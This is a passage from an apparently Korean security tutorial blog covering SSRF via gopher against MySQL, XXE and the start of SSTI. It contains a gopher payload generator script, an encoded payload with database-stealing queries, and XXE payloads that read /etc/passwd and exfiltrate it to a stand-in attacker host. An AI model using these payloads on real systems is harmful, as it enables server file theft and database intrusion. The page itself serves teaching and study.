data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">dump <span class=\"token operator\">=</span> <span class=\"token function\">raw_input</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Give connection packet of mysql: \"</span><span class=\"token punctuation\">)</span>\nquery <span class=\"token operator\">=</span> <span class=\"token function\">raw_input</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Give query to execute: \"</span><span class=\"token punctuation\">)</span>\n\nauth <span class=\"token operator\">=</span> dump<span class=\"token operator\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span>\n\ndef <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token class-name return-type\">a</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"gopher://127.0.0.1:3306/_%\"</span> <span class=\"token operator\">+</span> <span class=\"token string double-quoted-string\">\"%\"</span><span class=\"token operator\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n\ndef <span class=\"token function\">get_payload</span><span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>query<span class=\"token operator\">.</span><span class=\"token function\">strip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \t<span class=\"token class-name return-type\">query</span> <span class=\"token operator\">=</span> query<span class=\"token operator\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hex\"</span><span class=\"token punctuation\">)</span>\n    \tquery_length <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'{:x}'</span><span class=\"token operator\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \tpay1 <span class=\"token operator\">=</span> query_length<span class=\"token operator\">.</span><span class=\"token function\">rjust</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string double-quoted-string\">\"00000003\"</span> <span class=\"token operator\">+</span> query\n    \t<span class=\"token keyword\">final</span> <span class=\"token operator\">=</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>auth <span class=\"token operator\">+</span> pay1 <span class=\"token operator\">+</span> <span class=\"token string double-quoted-string\">\"0100000001\"</span><span class=\"token punctuation\">)</span>\n    \t<span class=\"token keyword\">return</span> <span class=\"token keyword\">final</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>auth<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"\\nYour gopher link is ready to do SSRF : \\n\"</span>\n<span class=\"token keyword\">print</span> <span class=\"token function\">get_payload</span><span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>최종적인 요청 패킷을 만들어 전송시 로그인이 완료되고 쿼리를 수행할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:3306/_%25%00%00%01%85%a6%03%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%61%74%00%00%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%40%00%00%00%03%73%65%6c%65%63%74%20%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%74%61%62%6c%65%5f%6e%61%6d%65%29%20%66%72%6f%6d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%74%61%62%6c%65%73%3b%01%00%00%00%01%25%00%00%01%85%a6%03%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%61%74%00%00%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%40%00%00%00%03%73%65%6c%65%63%74%20%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%74%61%62%6c%65%5f%6e%61%6d%65%29%20%66%72%6f%6d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%74%61%62%6c%65%73%3b%01%00%00%00%01'</span></code></pre></div>\n<ul>\n<li>다음과 같은 쿼리를 구성해서 gopher 패킷을 제작해 전송하여 서버측 데이터베이스 의 정보를 탈취할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">select @@version_comment limit <span class=\"token number\">1</span>@ select <span class=\"token function\">group_concat</span><span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> from information_schema<span class=\"token operator\">.</span>tables<span class=\"token punctuation\">;</span>\n\n<span class=\"token constant\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token constant\">FROM</span> Information_schema<span class=\"token operator\">.</span>tables <span class=\"token constant\">WHERE</span> table_schema <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'admin'</span> <span class=\"token keyword\">AND</span> table_name <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">;</span>\n\nadmin flag <span class=\"token constant\">BASE</span> TABLEInnoDB <span class=\"token number\">10</span>\n\nselect table_name<span class=\"token punctuation\">,</span>column_name from information_schema<span class=\"token operator\">.</span>columns where table_schema <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'admin'</span> <span class=\"token keyword\">and</span> table_name <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">use</span> <span class=\"token package\">admin</span><span class=\"token punctuation\">;</span>select <span class=\"token operator\">*</span> from flag<span class=\"token punctuation\">;</span></code></pre></div>\n<hr>\n<h1 id=\"xxe-xml-external-entity-injection-overview\" style=\"position:relative;\"><a href=\"#xxe-xml-external-entity-injection-overview\" aria-label=\"xxe xml external entity injection overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XXE (XML External Entity Injection) Overview</h1>\n<ul>\n<li>대상 애플리케이션 환경에서 XML 데이터를 처리할 시 공격자가 악의적인 요소를 삽입하여 서버의 데이터를 보거나 SSRF와 함께 이용할 수 있는 취약점 입니다.</li>\n<li>XXS는 웹에서만 발생하는 취약점이 아닌, pptx, xlsx, docx 등 OOXML을 사용하는 곳에서 도 발생합니다.</li>\n</ul>\n<p><strong>XML?</strong></p>\n<ul>\n<li>eXtensible Markup Language: 확장성 있는 마크업 언어</li>\n<li>W3C가 정보를 쉽게 교환하기 위해 만든 데이터 교환 포맷</li>\n<li>다음과 같이 <code class=\"language-text\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></code> 로 시작해서 사용자가 마음대로 태그를 정의해서 사용합니다.</li>\n<li>특정 데이터를 저장할 때 다음과 같이 포맷을 만들어서 저장하고 해당 내용을 불러올 때는 프로그램에 내장된 XML Parser를 이용합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<h1 id=\"xml-external-entity-injection-취약점\" style=\"position:relative;\"><a href=\"#xml-external-entity-injection-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"xml external entity injection 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XML External Entity Injection 취약점</h1>\n<ul>\n<li>서버상에 저장된 XML 데이터를 불러올 때 XML Parser에서 외부 엔티티를 사용한다는 구문이 있다면 XML Parser가 해당 내용을 일고 데이터를 처리합니다.</li>\n<li>만약에 일반적인 XML 데이터를 처리하는 프로그램이 있다고 하였을 때 외부 엔티티를 사용할 수있도록 코드를 주입하며 XXE 공격이 발생합니다.</li>\n<li>선언된 외부 요소를 사용하고 싶다면 <code class=\"language-text\">&amp;변수명</code> 과 같은 형식으로 사용합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">replace</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">xxe</span> <span class=\"token attr-name\">\"Uee\"</span><span class=\"token punctuation\">></span></span></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li>위 코드 인젝션을 수행하였을 경우 응답 데이터를 정상과 비교해보록 하겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\">정상 결과\nEmail : kevin@nasa.goc\nFirstName : Kevin\nLastName :\n\nXXE 공격 수행 결과\nEmail : kevin@nasa.goc\nFirstName : Kevin\nLastName : Uee</code></pre></div>\n<ul>\n<li>XXE 공격 수행 결과 “Uee” 라는 글자가 Response에 출력이 되었다면 파급력이 높은 XXE 공격이 성공할 가능성이 높아집니다.</li>\n</ul>\n<h3 id=\"그렇다면-xxe를-활용하여-무엇을-할-수-있까요\" style=\"position:relative;\"><a href=\"#%EA%B7%B8%EB%A0%87%EB%8B%A4%EB%A9%B4-xxe%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-%EB%AC%B4%EC%97%87%EC%9D%84-%ED%95%A0-%EC%88%98-%EC%9E%88%EA%B9%8C%EC%9A%94\" aria-label=\"그렇다면 xxe를 활용하여 무엇을 할 수 있까요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>그렇다면 XXE를 활용하여 무엇을 할 수 있까요?</h3>\n<ul>\n<li>파일 읽기 (file://, php://)</li>\n<li>SSRF (Port Scan, HTTP GET 접속,…)</li>\n<li>DOS (메모리 고갈 ⇒ &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, …)</li>\n<li>Remote Code Execution (jar:// , XXE+SSRF(gopher://))</li>\n<li>…</li>\n</ul>\n<h3 id=\"xxe-파일-읽기\" style=\"position:relative;\"><a href=\"#xxe-%ED%8C%8C%EC%9D%BC-%EC%9D%BD%EA%B8%B0\" aria-label=\"xxe 파일 읽기 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XXE 파일 읽기</h3>\n<ul>\n<li>file:// 프로토콜을 활용하여 서버내 파일을 읽어올 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">foo</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY xxe SYSTEM \"file://etc/passwd\"></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li>다음과 같이 서버에서 직접 접근해서 파일을 읽어오는 과정에서 인코딩 중 <code class=\"language-text\">&lt;, ></code> 문자가 포함되어 있는 경우 인코딩 에러가 발생할 수 있기 때문에 <code class=\"language-text\">base64</code> 인코딩을 과정을 거치는 과정을 수행합니다.</li>\n<li>php:// php wrapper 를 활용하여 base64로 응답 데이터를 인코딩을 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">foo</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\"></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<h3 id=\"bind-xxe-attack\" style=\"position:relative;\"><a href=\"#bind-xxe-attack\" aria-label=\"bind xxe attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bind XXE Attack</h3>\n<ul>\n<li>XXE 공격이 가능한 벡터가 존재하지만 서버에서 응답을 받을 수 없는 경우 활용 방안 입니다.</li>\n<li>다음은 외부 서버에 페이로드를 구성합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\">payload.xml\n\n&lt;!ENTITY % eval \"&lt;!ENTITY exfil SYSTEM 'http://attacker.kr/data?=%data;'>\"> %eval;</code></pre></div>\n<ul>\n<li>다음은 대상 애플리케이션 에 공격할 페이로드 입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">foo</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n&lt;!ENTITY % oob SYSTEM \"http://attacker.kr/payload.xml\"> % oob;</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&exfil;\">&amp;exfil;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li>해당 페이로드가 동작을 하면서 공격자 서버 access_log에 base64로 인코딩 된정보를 확인할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\">GET /data?bidF3123232oij== HTTP/1.0</code></pre></div>\n<hr>\n<h1 id=\"ssti-server-side-template-injection-overview\" style=\"position:relative;\"><a href=\"#ssti-server-side-template-injection-overview\" aria-label=\"ssti server side template injection overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSTI Server Side Template Injection Overview</h1>\n<ul>\n<li>웹 애플리케이션에 동적인 내용을 HTML로 출력할 때 미리 정의한 Template에 동적인 값을 넣어서 출력하는 Template engine을 이용합니다.</li>\n<li>대부분의 Template Engine 에서 <code class=\"language-text\">{{2*3}}</code>, <code class=\"language-text\">${2*3}</code> 과 같은 문법을 지원합니다.</li>\n<li>만약에 Template 내부에서 사용되는 Context가 아닌 Template Source에서 사용자 입력이 들어가게된다면 악의적인 입력을 통해 개발자가 의도하지 않은 임의의 Template 기능을 실행할 수 있게 됩니다.</li>\n<li>사용자의 입력 데이터가 Template에 직접 사용될 경우 Template Engine이 해석하여 실행하는 문법을 사용할 수 있기 때문에 SSTI가 발생합니다</li>\n</ul>\n<h1 id=\"server-side-template-injection-취약점\" style=\"position:relative;\"><a href=\"#server-side-template-injection-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"server side template injection 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Server Side Template Injection 취약점</h1>\n<h3 id=\"server-side-template-injection-example\" style=\"position:relative;\"><a href=\"#server-side-template-injection-example\" aria-label=\"server side template injection example permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Server Side Template Injection Example</h3>\n<ul>\n<li>Python Flask의 경우 Jinja2 Template Engine을 사용하며 아래와 같이 <code class=\"language-text\">render_template_string</code> API를 통해 해당 템플린 코드가 해석되어 클라이언트에 렌더링되어집니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token 